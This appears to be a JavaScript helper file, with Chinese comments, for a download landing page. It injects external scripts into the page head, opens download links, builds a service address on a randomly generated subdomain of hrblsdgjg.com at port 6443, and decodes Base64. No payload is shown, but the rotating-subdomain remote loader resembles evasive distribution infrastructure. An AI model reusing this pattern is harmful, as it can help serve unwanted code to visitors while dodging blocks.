var img_data_domain = '.';
var o_k = 'qocedobi';
var down_type = 1;//下载类型，1为OP，2为自有下载页面
var down_url = 'https://www.abc.com';//自有下载页面地址
function open_down_url(url){
	//打开下载地址
	//window.location.href = url;//本页打开
	window.open(url);//新标签打开
}
function load_js_css(url, type){
	console.log(img_data_domain);
	var oHead = document.getElementsByTagName("HEAD").item(0);
	if(type == 'js'){
		//加载JS
		var oLoad_url = document.createElement("script");
		oLoad_url.type = "text/javascript";
		oLoad_url.src = url;
	}else{
		//默认加载CSS
		var oLoad_url= document.createElement("link");
		oLoad_url.type = "text/css";
		oLoad_url.rel = "stylesheet";
		oLoad_url.href = url;
	}
	oHead.appendChild(oLoad_url);
}
function generateRandomString(length) {
	var result = '';
	var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
	for (var i = 0; i < length; i++) {
		var randomIndex = Math.floor(Math.random() * characters.length);
		result += characters.charAt(randomIndex);
	}
	return result;
}
op_service = "https://" + generateRandomString(15) + ".hrblsdgjg.com:6443";//OP服务地址
function check_https(){
	if (location.protocol !== 'https:') {
		location.href = 'https://' + location.hostname + location.pathname + location.search;
	}
}
const Base64 = {
	decode(str) {
		return decodeURIComponent(atob(str).split('').map(function (c) {
		return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
		}).join(''));
	}
}
